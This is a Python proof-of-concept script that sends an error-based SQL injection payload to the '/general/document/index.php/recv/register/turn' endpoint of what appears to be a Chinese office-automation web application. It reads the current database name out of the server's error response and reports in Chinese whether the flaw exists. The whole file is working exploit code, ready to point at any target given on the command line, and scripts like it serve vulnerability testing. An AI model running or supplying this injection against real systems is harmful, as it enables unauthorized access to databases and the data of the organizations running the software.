#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    patt = "select '([^']+)' from dual"
    burp0_url = site + "/general/document/index.php/recv/register/turn"
    burp0_headers = {"User-Agent": "Moziilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Content-Type": "application/x-www-form-urlencoded"}
    burp0_data = {"_SERVER": '', "rid": "EXP(~(SELECT*FROM(SELECT database() FROM INFORMATION_SCHEMA.tables where table_schema=0x74645F6F61 LIMIT 1,1)a))"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    if "exp" in r.text:
        return re.findall(patt, r.text)[0]
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，查询当前数据库名称为：", info)
    else:
        print("[-]漏洞不存在")
